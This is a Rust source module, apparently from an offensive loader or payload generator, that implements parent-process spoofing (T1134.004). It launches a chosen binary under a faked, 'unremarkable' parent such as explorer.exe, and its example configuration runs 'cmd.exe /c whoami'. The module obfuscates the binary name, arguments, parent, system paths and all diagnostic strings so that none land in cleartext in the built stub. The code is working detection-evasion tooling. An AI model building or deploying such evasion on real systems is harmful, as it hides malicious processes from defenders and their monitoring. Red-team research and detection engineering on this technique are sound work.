//! Parent-process spoofing.
//!
//! Launches a process whose recorded parent is a different, legitimate process,
//! so the process tree does not show the loader. See `README.md` for the full
//! write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for parent-process spoofing.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Executable to launch.
    #[serde(default)]
    pub binary: String,
    /// Arguments for the executable.
    #[serde(default)]
    pub args: Vec<String>,
    /// Process whose PID is declared as the new process's parent. Defaults to a
    /// process every session has.
    #[serde(default = "default_parent")]
    pub parent: String,
    /// Whether the loader waits for the child and relays its exit code.
    ///
    /// Defaults to `true`. With `false` the child is left running and the step's
    /// result is `0`: the loader does not own the child's lifetime any more.
    #[serde(default = "default_wait")]
    pub wait: bool,
}

impl Default for Params {
    /// Defaults to a present, unremarkable parent (see [`default_parent`]).
    ///
    /// The manual impl keeps `Params::default()` and the `serde` field default
    /// in step: a runtime step with no `params:` mapping gets the default
    /// struct, not the field-level defaults.
    fn default() -> Self {
        Self {
            binary: String::new(),
            args: Vec::new(),
            parent: default_parent(),
            wait: default_wait(),
        }
    }
}

/// The default parent: the session's shell, which is always present when a user
/// is logged in and looks unremarkable as a parent.
pub fn default_parent() -> String {
    "explorer.exe".to_string()
}

fn default_wait() -> bool {
    true
}

/// Static metadata for parent-process spoofing.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "ppid_spoofing",
    attck: &["T1134.004"],
    stability: Stability::Stable,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Control,
    doc_path: "src/techniques/ppid_spoofing/README.md",
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[],
    requires_indirect_syscalls: false,
    params_example: "technique: ppid_spoofing\nparams:\n  binary: cmd.exe\n  args: [\"/c\", \"whoami\"]\n  parent: explorer.exe\n  wait: true\n",
    readme: include_str!("README.md"),
    // Pure Win32 (CreateProcessA + UpdateProcThreadAttribute): no kernel call
    // goes through the syscall layer.
    syscalls: &[],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment` replaces each placeholder with code that rebuilds the
/// message at run time, so no diagnostic text lands in the generated stub's
/// `.rdata` (the same rule every stub fragment follows).
const MESSAGES: &[(&str, &str)] = &[
    (
        "$MSG_NO_BINARY$",
        "no binary was configured for the spoofed launch",
    ),
    (
        "$MSG_NO_PARENT$",
        "no parent process was configured to spoof",
    ),
    (
        "$MSG_SNAPSHOT_FAILED$",
        "could not enumerate processes to find the parent",
    ),
    ("$MSG_ENUM_FAILED$", "could not read the process snapshot"),
    (
        "$MSG_PARENT_NOT_FOUND$",
        "no running process matches the configured parent",
    ),
    (
        "$MSG_PARENT_OPEN_FAILED$",
        "could not open the parent process",
    ),
    (
        "$MSG_ATTR_SIZE_FAILED$",
        "could not size the process attribute list",
    ),
    (
        "$MSG_ATTR_INIT_FAILED$",
        "could not initialize the process attribute list",
    ),
    (
        "$MSG_ATTR_UPDATE_FAILED$",
        "could not set the parent-process attribute",
    ),
    (
        "$MSG_CREATE_FAILED$",
        "could not launch the child under the spoofed parent",
    ),
    ("$MSG_WAIT_FAILED$", "could not read the child's exit code"),
];

impl Params {
    /// Renders the parent-spoofing stub fragment for these parameters.
    ///
    /// The binary, its arguments, the parent's name and every diagnostic are
    /// emitted as code that rebuilds the string at run time through `strings`,
    /// so none of them lands in the artifact in cleartext. The launch's own
    /// fixed strings (the environment variable holding the system root and its
    /// fallback, and the system directory below it) are obfuscated the same way;
    /// `wait` is a plain compile-time value.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let mut rendered = DEF.stub_fragment.to_string();
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("msg_{index}")),
            );
        }

        let binary = strings
            .obfuscate(&self.binary)
            .render_stub_expr("launch_binary");
        let parent = strings
            .obfuscate(&self.parent)
            .render_stub_expr("launch_parent");
        let args_def = if self.args.is_empty() {
            "vec![]".to_string()
        } else {
            let mut body = String::from("vec![\n");
            for (index, arg) in self.args.iter().enumerate() {
                let expr = strings
                    .obfuscate(arg)
                    .render_stub_expr(&format!("launch_arg_{index}"));
                body.push_str(&format!("            {expr},\n"));
            }
            body.push_str("        ]");
            body
        };
        let systemroot_var = strings
            .obfuscate("SystemRoot")
            .render_stub_expr("env_systemroot");
        let windows_fallback = strings
            .obfuscate("C:\\Windows")
            .render_stub_expr("windows_dir");
        let system32_dir = strings
            .obfuscate("System32")
            .render_stub_expr("system32_dir");

        rendered
            .replace("$BINARY_DEF$", &binary)
            .replace("$ARGS_DEF$", &args_def)
            .replace("$PARENT_DEF$", &parent)
            .replace("$WAIT$", if self.wait { "true" } else { "false" })
            .replace("$ENV_SYSTEMROOT$", &systemroot_var)
            .replace("$WINDOWS_FALLBACK$", &windows_fallback)
            .replace("$SYSTEM32_DIR$", &system32_dir)
    }
}

#[cfg(test)]
mod tests;
